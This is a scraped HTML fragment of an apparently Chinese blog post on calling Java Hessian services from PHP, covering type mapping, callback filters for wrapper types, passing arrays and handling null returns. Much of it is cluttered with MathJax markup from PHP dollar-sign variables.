0.003em;\"><span class=\"mrow\" id=\"MathJax-Span-73581\"><span style=\"display: inline-block; position: relative; width: 38.281em; height: 0px;\"><span style=\"position: absolute; clip: rect(3.058em 1000em 4.392em -0.497em); top: -3.997em; left: 0.003em;\"><span class=\"mi\" id=\"MathJax-Span-73582\" style=\"font-family: STIXGeneral-Italic;\">o</span><span class=\"mi\" id=\"MathJax-Span-73583\" style=\"font-family: STIXGeneral-Italic;\">p</span><span class=\"mi\" id=\"MathJax-Span-73584\" style=\"font-family: STIXGeneral-Italic;\">t<span style=\"display: inline-block; overflow: hidden; height: 1px; width: 0.003em;\"></span></span><span class=\"mi\" id=\"MathJax-Span-73585\" style=\"font-family: STIXGeneral-Italic;\">i</span><span class=\"mi\" id=\"MathJax-Span-73586\" style=\"font-family: STIXGeneral-Italic;\">o</span><span class=\"mi\" id=\"MathJax-Span-73587\" style=\"font-family: STIXGeneral-Italic;\">n</span><span class=\"mi\" id=\"MathJax-Span-73588\" style=\"font-family: STIXGeneral-Italic;\">s</span><span class=\"mo\" id=\"MathJax-Span-73589\" style=\"font-family: STIXGeneral-Regular;\">−</span><span class=\"mo\" id=\"MathJax-Span-73590\" style=\"font-family: STIXGeneral-Regular; padding-left: 0.336em;\">&gt;</span><span class=\"mi\" id=\"MathJax-Span-73591\" style=\"font-family: STIXGeneral-Italic; padding-left: 0.336em;\">t<span style=\"display: inline-block; overflow: hidden; height: 1px; width: 0.003em;\"></span></span><span class=\"mi\" id=\"MathJax-Span-73592\" style=\"font-family: STIXGeneral-Italic;\">y</span><span class=\"mi\" id=\"MathJax-Span-73593\" style=\"font-family: STIXGeneral-Italic;\">p</span><span class=\"mi\" id=\"MathJax-Span-73594\" style=\"font-family: STIXGeneral-Italic;\">e</span><span class=\"mi\" id=\"MathJax-Span-73595\" style=\"font-family: STIXGeneral-Italic;\">M<span style=\"display: inline-block; overflow: hidden; height: 1px; width: 0.058em;\"></span></span><span class=\"mi\" id=\"MathJax-Span-73596\" style=\"font-family: STIXGeneral-Italic;\">a</span><span class=\"mi\" id=\"MathJax-Span-73597\" style=\"font-family: STIXGeneral-Italic;\">p</span><span class=\"mo\" id=\"MathJax-Span-73598\" style=\"font-family: STIXGeneral-Regular;\">[</span><span class=\"mo\" id=\"MathJax-Span-73599\" style=\"font-family: STIXGeneral-Regular;\">‘</span><span class=\"mi\" id=\"MathJax-Span-73600\" style=\"font-family: STIXGeneral-Italic;\">P</span><span class=\"mi\" id=\"MathJax-Span-73601\" style=\"font-family: STIXGeneral-Italic;\">e</span><span class=\"mi\" id=\"MathJax-Span-73602\" style=\"font-family: STIXGeneral-Italic;\">r<span style=\"display: inline-block; overflow: hidden; height: 1px; width: 0.003em;\"></span></span><span class=\"mi\" id=\"MathJax-Span-73603\" style=\"font-family: STIXGeneral-Italic;\">s</span><span class=\"mi\" id=\"MathJax-Span-73604\" style=\"font-family: STIXGeneral-Italic;\">o</span><span class=\"msup\" id=\"MathJax-Span-73605\"><span style=\"display: inline-block; position: relative; width: 0.781em; height: 0px;\"><span style=\"position: absolute; clip: rect(1.892em 1000em 2.669em -0.497em); top: -2.497em; left: 0.003em;\"><span class=\"mi\" id=\"MathJax-Span-73606\" style=\"font-family: STIXGeneral-Italic;\">n</span><span style=\"display: inline-block; width: 0px; height: 2.503em;\"></span></span><span style=\"position: absolute; top: -2.775em; left: 0.503em;\"><span class=\"mo\" id=\"MathJax-Span-73607\" style=\"font-size: 70.7%; font-family: STIXVariants;\">′</span><span style=\"display: inline-block; width: 0px; height: 2.392em;\"></span></span></span></span><span class=\"mo\" id=\"MathJax-Span-73608\" style=\"font-family: STIXGeneral-Regular;\">]</span><span class=\"msup\" id=\"MathJax-Span-73609\" style=\"padding-left: 0.336em;\"><span style=\"display: inline-block; position: relative; width: 0.947em; height: 0px;\"><span style=\"position: absolute; clip: rect(1.947em 1000em 2.669em -0.442em); top: -2.497em; left: 0.003em;\"><span class=\"mo\" id=\"MathJax-Span-73610\" style=\"font-family: STIXGeneral-Regular;\">=</span><span style=\"display: inline-block; width: 0px; height: 2.503em;\"></span></span><span style=\"position: absolute; top: -2.775em; left: 0.669em;\"><span class=\"mo\" id=\"MathJax-Span-73611\" style=\"font-size: 70.7%; font-family: STIXVariants;\">′</span><span style=\"display: inline-block; width: 0px; height: 2.392em;\"></span></span></span></span><span class=\"mi\" id=\"MathJax-Span-73612\" style=\"font-family: STIXGeneral-Italic; padding-left: 0.336em;\">c</span><span class=\"mi\" id=\"MathJax-Span-73613\" style=\"font-family: STIXGeneral-Italic;\">o</span><span class=\"mi\" id=\"MathJax-Span-73614\" style=\"font-family: STIXGeneral-Italic;\">m</span><span class=\"mo\" id=\"MathJax-Span-73615\" style=\"font-family: STIXGeneral-Regular;\">.</span><span class=\"mi\" id=\"MathJax-Span-73616\" style=\"font-family: STIXGeneral-Italic; padding-left: 0.169em;\">s</span><span class=\"mi\" id=\"MathJax-Span-73617\" style=\"font-family: STIXGeneral-Italic;\">a</span><span class=\"mi\" id=\"MathJax-Span-73618\" style=\"font-family: STIXGeneral-Italic;\">m</span><span class=\"mi\" id=\"MathJax-Span-73619\" style=\"font-family: STIXGeneral-Italic;\">p</span><span class=\"mi\" id=\"MathJax-Span-73620\" style=\"font-family: STIXGeneral-Italic;\">l<span style=\"display: inline-block; overflow: hidden; height: 1px; width: 0.003em;\"></span></span><span class=\"mi\" id=\"MathJax-Span-73621\" style=\"font-family: STIXGeneral-Italic;\">e</span><span class=\"mo\" id=\"MathJax-Span-73622\" style=\"font-family: STIXGeneral-Regular;\">.</span><span class=\"mi\" id=\"MathJax-Span-73623\" style=\"font-family: STIXGeneral-Italic; padding-left: 0.169em;\">h</span><span class=\"mi\" id=\"MathJax-Span-73624\" style=\"font-family: STIXGeneral-Italic;\">e</span><span class=\"mi\" id=\"MathJax-Span-73625\" style=\"font-family: STIXGeneral-Italic;\">s</span><span class=\"mi\" id=\"MathJax-Span-73626\" style=\"font-family: STIXGeneral-Italic;\">s</span><span class=\"mi\" id=\"MathJax-Span-73627\" style=\"font-family: STIXGeneral-Italic;\">i</span><span class=\"mi\" id=\"MathJax-Span-73628\" style=\"font-family: STIXGeneral-Italic;\">a</span><span class=\"mi\" id=\"MathJax-Span-73629\" style=\"font-family: STIXGeneral-Italic;\">n</span><span class=\"mo\" id=\"MathJax-Span-73630\" style=\"font-family: STIXGeneral-Regular;\">.</span><span class=\"mi\" id=\"MathJax-Span-73631\" style=\"font-family: STIXGeneral-Italic; padding-left: 0.169em;\">P</span><span class=\"mi\" id=\"MathJax-Span-73632\" style=\"font-family: STIXGeneral-Italic;\">e</span><span class=\"mi\" id=\"MathJax-Span-73633\" style=\"font-family: STIXGeneral-Italic;\">r<span style=\"display: inline-block; overflow: hidden; height: 1px; width: 0.003em;\"></span></span><span class=\"mi\" id=\"MathJax-Span-73634\" style=\"font-family: STIXGeneral-Italic;\">s</span><span class=\"mi\" id=\"MathJax-Span-73635\" style=\"font-family: STIXGeneral-Italic;\">o</span><span class=\"msup\" id=\"MathJax-Span-73636\"><span style=\"display: inline-block; position: relative; width: 0.781em; height: 0px;\"><span style=\"position: absolute; clip: rect(1.892em 1000em 2.669em -0.497em); top: -2.497em; left: 0.003em;\"><span class=\"mi\" id=\"MathJax-Span-73637\" style=\"font-family: STIXGeneral-Italic;\">n</span><span style=\"display: inline-block; width: 0px; height: 2.503em;\"></span></span><span style=\"position: absolute; top: -2.775em; left: 0.503em;\"><span class=\"mo\" id=\"MathJax-Span-73638\" style=\"font-size: 70.7%; font-family: STIXVariants;\">′</span><span style=\"display: inline-block; width: 0px; height: 2.392em;\"></span></span></span></span><span class=\"mo\" id=\"MathJax-Span-73639\" style=\"font-family: STIXGeneral-Regular;\">;</span><span class=\"mo\" id=\"MathJax-Span-73640\" style=\"font-family: STIXGeneral-Regular; padding-left: 0.169em;\">−</span><span class=\"mo\" id=\"MathJax-Span-73641\" style=\"font-family: STIXGeneral-Regular; padding-left: 0.336em;\">&gt;</span><span class=\"texatom\" id=\"MathJax-Span-73642\" style=\"padding-left: 0.336em;\"><span class=\"mrow\" id=\"MathJax-Span-73643\"><span class=\"mo\" id=\"MathJax-Span-73644\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">精</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73645\"><span class=\"mrow\" id=\"MathJax-Span-73646\"><span class=\"mo\" id=\"MathJax-Span-73647\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">确</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73648\"><span class=\"mrow\" id=\"MathJax-Span-73649\"><span class=\"mo\" id=\"MathJax-Span-73650\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">指</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73651\"><span class=\"mrow\" id=\"MathJax-Span-73652\"><span class=\"mo\" id=\"MathJax-Span-73653\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">定</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73654\"><span class=\"mrow\" id=\"MathJax-Span-73655\"><span class=\"mo\" id=\"MathJax-Span-73656\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">，</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73657\"><span class=\"mrow\" id=\"MathJax-Span-73658\"><span class=\"mo\" id=\"MathJax-Span-73659\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">可</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73660\"><span class=\"mrow\" id=\"MathJax-Span-73661\"><span class=\"mo\" id=\"MathJax-Span-73662\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">用</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73663\"><span class=\"mrow\" id=\"MathJax-Span-73664\"><span class=\"mo\" id=\"MathJax-Span-73665\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">于</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73666\"><span class=\"mrow\" id=\"MathJax-Span-73667\"><span class=\"mo\" id=\"MathJax-Span-73668\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">解</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73669\"><span class=\"mrow\" id=\"MathJax-Span-73670\"><span class=\"mo\" id=\"MathJax-Span-73671\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">析</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73672\"><span class=\"mrow\" id=\"MathJax-Span-73673\"><span class=\"mo\" id=\"MathJax-Span-73674\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">返</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73675\"><span class=\"mrow\" id=\"MathJax-Span-73676\"><span class=\"mo\" id=\"MathJax-Span-73677\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">回</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73678\"><span class=\"mrow\" id=\"MathJax-Span-73679\"><span class=\"mo\" id=\"MathJax-Span-73680\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">值</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73681\"><span class=\"mrow\" id=\"MathJax-Span-73682\"><span class=\"mo\" id=\"MathJax-Span-73683\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">，</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73684\"><span class=\"mrow\" id=\"MathJax-Span-73685\"><span class=\"mo\" id=\"MathJax-Span-73686\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">也</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73687\"><span class=\"mrow\" id=\"MathJax-Span-73688\"><span class=\"mo\" id=\"MathJax-Span-73689\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">可</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73690\"><span class=\"mrow\" id=\"MathJax-Span-73691\"><span class=\"mo\" id=\"MathJax-Span-73692\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">用</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73693\"><span class=\"mrow\" id=\"MathJax-Span-73694\"><span class=\"mo\" id=\"MathJax-Span-73695\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">于</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-73696\"><span class=\"mrow\" id=\"MathJax-Span-73697\"><span class=\"mo\" id=\"MathJax-Span-73698\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">传</span></span></span></span><span style=\"display: inline-block; width: 0px; height: 4.003em;\"></span></span><span style=\"position: absolute; clip: rect(3.058em 1000em 4.392em -0.497em); top: -2.497em; left: 0.003em;\"><span class=\"texatom\" id=\"MathJax-Span-73699\"><span class=\"mrow\" id=\"MathJax-Span-73700\"><span class=\"mo\" id=\"MathJax-Span-73701\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">参</span></span></span></span><span style=\"display: inline-block; width: 0px; height: 4.003em;\"></span></span></span></span><span style=\"display: inline-block; width: 0px; height: 4.003em;\"></span></span></span><span style=\"border-left: 0.003em solid; display: inline-block; overflow: hidden; width: 0px; height: 3.137em; vertical-align: -2.063em;\"></span></span></nobr></span><script type=\"math/tex\" id=\"MathJax-Element-1837\">options->typeMap[‘Person’]=’com.sample.hessian.Person’;->精确指定，可用于解析返回值，也可用于传参  \n</script>options-&gt;typeMap[‘Person’]=’*.Person’;  ——&gt;采用通配，只适用于解析返回值，不能用于传参</p>\n\n\n\n<h3 id=\"6关于类型自动映射的回调处理\">6.关于类型自动映射的，回调处理：</h3>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs php\"><span class=\"hljs-variable\">$options</span>-&gt;parseFilters[<span class=\"hljs-string\">'@CalendarHandler'</span>] = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">'CalendarHandler'</span>,<span class=\"hljs-string\">'calendarToDateTime'</span>);\n<span class=\"hljs-variable\">$options</span>-&gt;writeFilters[<span class=\"hljs-string\">'@Person'</span>] = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">'CalendarHandler'</span>,<span class=\"hljs-string\">'writePerson'</span>);</code></pre>\n\n<p>对于包装类型，有两种方式处理：一是原生构建层级关系，二是采用回调去除包装</p>\n\n<p>一是原生构建层级关系:</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\"><span class=\"hljs-variable\">$p</span> <span class=\"hljs-subst\">=</span> <span class=\"hljs-literal\">new</span> Person();\n<span class=\"hljs-variable\">$p</span><span class=\"hljs-subst\">-&gt;</span>firstName <span class=\"hljs-subst\">=</span> <span class=\"hljs-string\">'John'</span>;\n<span class=\"hljs-variable\">$p</span><span class=\"hljs-subst\">-&gt;</span>lastName <span class=\"hljs-subst\">=</span> <span class=\"hljs-string\">'Sheppard'</span>;\n<span class=\"hljs-variable\">$p</span><span class=\"hljs-subst\">-&gt;</span>birthDate <span class=\"hljs-subst\">=</span> <span class=\"hljs-literal\">new</span> CalendarHandler(<span class=\"hljs-literal\">new</span> DateTime(<span class=\"hljs-string\">'1970-06-14 12:00:00'</span>));\n<span class=\"hljs-attribute\">...</span> send the object</code></pre>\n\n<p>二是采用回调去除包装</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs php\"><span class=\"hljs-variable\">$options</span>-&gt;parseFilters[<span class=\"hljs-string\">'@CalendarHandler'</span>] = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">'CalendarHandler'</span>,<span class=\"hljs-string\">'calendarToDateTime'</span>);\n<span class=\"hljs-variable\">$options</span>-&gt;writeFilters[<span class=\"hljs-string\">'@Person'</span>] = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">'CalendarHandler'</span>,<span class=\"hljs-string\">'writePerson'</span>);</code></pre>\n\n<p>建议尽量不要有包装类型，如果一定有，采用“原生层级类型”比较容易理解一些。</p>\n\n\n\n<h3 id=\"7原生传值\">7.原生传值：</h3>\n\n<pre><code>public User getUserList(List list);  --------&gt;List  ------&gt;对应于php的数字array\npublic User getUserSet(Set set);  --------&gt;Set ------&gt;对应于php的名字array\npublic User getUserMap(Map map);  --------&gt;Map ------&gt;对应于php的名字array\n\n    //$parameter = array('杨', '文超'); //数字array        \n    //$parameter = array('firstName'=&gt;'杨', 'lastName'=&gt;'文超');//名字array   \n    $parameter = array('firstName'=&gt;'杨', 'lastName'=&gt;'文超');  //名字array        \n    //$user = $proxy-&gt;getUserList($parameter);\n    //$user = $proxy-&gt;getUserSet($parameter);\n    $user = $proxy-&gt;getUserMap($parameter);\n</code></pre>\n\n\n\n<h3 id=\"8返回值为null\">8.返回值为null</h3>\n\n<p><span class=\"MathJax_Preview\"></span><span class=\"MathJax\" id=\"MathJax-Element-1903-Frame\" role=\"textbox\" aria-readonly=\"true\"><nobr><span class=\"math\" id=\"MathJax-Span-76282\" style=\"width: 26.281em; display: inline-block;\"><span style=\"display: inline-block; position: relative; width: 21.892em; height: 0px; font-size: 120%;\"><span style=\"position: absolute; clip: rect(1.558em 1000em 2.892em -0.442em); top: -2.497em; left: 0.003em;\"><span class=\"mrow\" id=\"MathJax-Span-76283\"><span class=\"mi\" id=\"MathJax-Span-76284\" style=\"font-family: STIXGeneral-Italic;\">u</span><span class=\"mi\" id=\"MathJax-Span-76285\" style=\"font-family: STIXGeneral-Italic;\">s</span><span class=\"mi\" id=\"MathJax-Span-76286\" style=\"font-family: STIXGeneral-Italic;\">e</span><span class=\"mi\" id=\"MathJax-Span-76287\" style=\"font-family: STIXGeneral-Italic;\">r<span style=\"display: inline-block; overflow: hidden; height: 1px; width: 0.003em;\"></span></span><span class=\"mo\" id=\"MathJax-Span-76288\" style=\"font-family: STIXGeneral-Regular; padding-left: 0.336em;\">=</span><span class=\"mo\" id=\"MathJax-Span-76289\" style=\"font-family: STIXGeneral-Regular;\">—</span><span class=\"mo\" id=\"MathJax-Span-76290\" style=\"font-family: STIXGeneral-Regular; padding-left: 0.169em;\">—</span><span class=\"mo\" id=\"MathJax-Span-76291\" style=\"font-family: STIXGeneral-Regular; padding-left: 0.169em;\">−</span><span class=\"mo\" id=\"MathJax-Span-76292\" style=\"font-family: STIXGeneral-Regular; padding-left: 0.336em;\">&gt;</span><span class=\"texatom\" id=\"MathJax-Span-76293\" style=\"padding-left: 0.336em;\"><span class=\"mrow\" id=\"MathJax-Span-76294\"><span class=\"mo\" id=\"MathJax-Span-76295\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">如</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-76296\"><span class=\"mrow\" id=\"MathJax-Span-76297\"><span class=\"mo\" id=\"MathJax-Span-76298\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">果</span></span></span></span><span class=\"mi\" id=\"MathJax-Span-76299\" style=\"font-family: STIXGeneral-Italic;\">j<span style=\"display: inline-block; overflow: hidden; height: 1px; width: 0.003em;\"></span></span><span class=\"mi\" id=\"MathJax-Span-76300\" style=\"font-family: STIXGeneral-Italic;\">a</span><span class=\"mi\" id=\"MathJax-Span-76301\" style=\"font-family: STIXGeneral-Italic;\">v</span><span class=\"mi\" id=\"MathJax-Span-76302\" style=\"font-family: STIXGeneral-Italic;\">a</span><span class=\"texatom\" id=\"MathJax-Span-76303\"><span class=\"mrow\" id=\"MathJax-Span-76304\"><span class=\"mo\" id=\"MathJax-Span-76305\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">端</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-76306\"><span class=\"mrow\" id=\"MathJax-Span-76307\"><span class=\"mo\" id=\"MathJax-Span-76308\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">返</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-76309\"><span class=\"mrow\" id=\"MathJax-Span-76310\"><span class=\"mo\" id=\"MathJax-Span-76311\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">回</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-76312\"><span class=\"mrow\" id=\"MathJax-Span-76313\"><span class=\"mo\" id=\"MathJax-Span-76314\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">值</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-76315\"><span class=\"mrow\" id=\"MathJax-Span-76316\"><span class=\"mo\" id=\"MathJax-Span-76317\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">为</span></span></span></span><span class=\"mi\" id=\"MathJax-Span-76318\" style=\"font-family: STIXGeneral-Italic;\">n</span><span class=\"mi\" id=\"MathJax-Span-76319\" style=\"font-family: STIXGeneral-Italic;\">u</span><span class=\"mi\" id=\"MathJax-Span-76320\" style=\"font-family: STIXGeneral-Italic;\">l<span style=\"display: inline-block; overflow: hidden; height: 1px; width: 0.003em;\"></span></span><span class=\"mi\" id=\"MathJax-Span-76321\" style=\"font-family: STIXGeneral-Italic;\">l<span style=\"display: inline-block; overflow: hidden; height: 1px; width: 0.003em;\"></span></span><span class=\"texatom\" id=\"MathJax-Span-76322\"><span class=\"mrow\" id=\"MathJax-Span-76323\"><span class=\"mo\" id=\"MathJax-Span-76324\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">，</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-76325\"><span class=\"mrow\" id=\"MathJax-Span-76326\"><span class=\"mo\" id=\"MathJax-Span-76327\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">那</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-76328\"><span class=\"mrow\" id=\"MathJax-Span-76329\"><span class=\"mo\" id=\"MathJax-Span-76330\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">么</span></span></span></span><span class=\"mi\" id=\"MathJax-Span-76331\" style=\"font-family: STIXGeneral-Italic;\">p</span><span class=\"mi\" id=\"MathJax-Span-76332\" style=\"font-family: STIXGeneral-Italic;\">h</span><span class=\"mi\" id=\"MathJax-Span-76333\" style=\"font-family: STIXGeneral-Italic;\">p</span><span class=\"texatom\" id=\"MathJax-Span-76334\"><span class=\"mrow\" id=\"MathJax-Span-76335\"><span class=\"mo\" id=\"MathJax-Span-76336\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">端</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-76337\"><span class=\"mrow\" id=\"MathJax-Span-76338\"><span class=\"mo\" id=\"MathJax-Span-76339\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">为</span></span></span></span></span><span style=\"display: inline-block; width: 0px; height: 2.503em;\"></span></span></span><span style=\"border-left: 0.003em solid; display: inline-block; overflow: hidden; width: 0px; height: 1.337em; vertical-align: -0.33em;\"></span></span></nobr></span><script type=\"math/tex\" id=\"MathJax-Element-1903\">user = ——->如果java端返回值为null，那么php端为  \n</script>result = isset(<span class=\"MathJax_Preview\"></span><span class=\"MathJax\" id=\"MathJax-Element-1904-Frame\" role=\"textbox\" aria-readonly=\"true\"><nobr><span class=\"math\" id=\"MathJax-Span-76340\" style=\"width: 16.003em; display: inline-block;\"><span style=\"display: inline-block; position: relative; width: 13.336em; height: 0px; font-size: 120%;\"><span style=\"position: absolute; clip: rect(1.558em 1000em 2.892em -0.442em); top: -2.497em; left: 0.003em;\"><span class=\"mrow\" id=\"MathJax-Span-76341\"><span class=\"mi\" id=\"MathJax-Span-76342\" style=\"font-family: STIXGeneral-Italic;\">u</span><span class=\"mi\" id=\"MathJax-Span-76343\" style=\"font-family: STIXGeneral-Italic;\">s</span><span class=\"mi\" id=\"MathJax-Span-76344\" style=\"font-family: STIXGeneral-Italic;\">e</span><span class=\"mi\" id=\"MathJax-Span-76345\" style=\"font-family: STIXGeneral-Italic;\">r<span style=\"display: inline-block; overflow: hidden; height: 1px; width: 0.003em;\"></span></span><span class=\"mo\" id=\"MathJax-Span-76346\" style=\"font-family: STIXGeneral-Regular;\">)</span><span class=\"mo\" id=\"MathJax-Span-76347\" style=\"font-family: STIXGeneral-Regular;\">;</span><span class=\"mo\" id=\"MathJax-Span-76348\" style=\"font-family: STIXGeneral-Regular; padding-left: 0.169em;\">—</span><span class=\"mo\" id=\"MathJax-Span-76349\" style=\"font-family: STIXGeneral-Regular; padding-left: 0.169em;\">—</span><span class=\"mo\" id=\"MathJax-Span-76350\" style=\"font-family: STIXGeneral-Regular; padding-left: 0.169em;\">−</span><span class=\"mo\" id=\"MathJax-Span-76351\" style=\"font-family: STIXGeneral-Regular; padding-left: 0.336em;\">&gt;</span><span class=\"texatom\" id=\"MathJax-Span-76352\" style=\"padding-left: 0.336em;\"><span class=\"mrow\" id=\"MathJax-Span-76353\"><span class=\"mo\" id=\"MathJax-Span-76354\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">结</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-76355\"><span class=\"mrow\" id=\"MathJax-Span-76356\"><span class=\"mo\" id=\"MathJax-Span-76357\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">果</span></span></span></span><span class=\"texatom\" id=\"MathJax-Span-76358\"><span class=\"mrow\" id=\"MathJax-Span-76359\"><span class=\"mo\" id=\"MathJax-Span-76360\"><span style=\"font-family: STIXGeneral, &quot;Arial Unicode MS&quot;, serif; font-size: 83%; font-style: normal; font-weight: normal;\">为</span></span></span></span><span class=\"mi\" id=\"MathJax-Span-76361\" style=\"font-family: STIXGeneral-Italic;\">f<span style=\"display: inline-block; overflow: hidden; height: 1px; width: 0.169em;\"></span></span><span class=\"mi\" id=\"MathJax-Span-76362\" style=\"font-family: STIXGeneral-Italic;\">a</span><span class=\"mi\" id=\"MathJax-Span-76363\" style=\"font-family: STIXGeneral-Italic;\">l<span style=\"display: inline-block; overflow: hidden; height: 1px; width: 0.003em;\"></span></span><span class=\"mi\" id=\"MathJax-Span-76364\" style=\"font-family: STIXGeneral-Italic;\">s</span><span class=\"mi\" id=\"MathJax-Span-76365\" style=\"font-family: STIXGeneral-Italic;\">e</span><span class=\"mi\" id=\"MathJax-Span-76366\" style=\"font-family: STIXGeneral-Italic;\">e</span><span class=\"mi\" id=\"MathJax-Span-76367\" style=\"font-family: STIXGeneral-Italic;\">c</span><span class=\"mi\" id=\"MathJax-Span-76368\" style=\"font-family: STIXGeneral-Italic;\">h</span><span class=\"mi\" id=\"MathJax-Span-76369\" style=\"font-family: STIXGeneral-Italic;\">o</span></span><span style=\"display: inline-block; width: 0px; height: 2.503em;\"></span></span></span><span style=\"border-left: 0.003em solid; display: inline-block; overflow: hidden; width: 0px; height: 1.337em; vertical-align: -0.33em;\"></span></span></nobr></span><script type=\"math/tex\" id=\"MathJax-Element-1904\">user); ——->结果为false  \necho </script>result;  ——&gt;打印后，显示不了false字样</p>\n\n<p><a href=\"http://stackoverflow.com/questions/3671455/php-boolean-to-string-with-modification-a-condition\">PHP boolean to string with modification &amp; a condition</a></p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\"><span class=\"hljs-built_in\">echo</span>(is_bool(<span class=\"hljs-variable\">$x</span>) ? (<span class=\"hljs-variable\">$x</span> ? <span class=\"hljs-string\">\"true\"</span>:<span class=\"hljs-string\">\"false\"</span>):<span class=\"hljs-variable\">$x</span>);\nNot the easiest to <span class=\"hljs-built_in\">read</span> but gets the job <span class=\"hljs-keyword\">done</span>!</code></pre>",
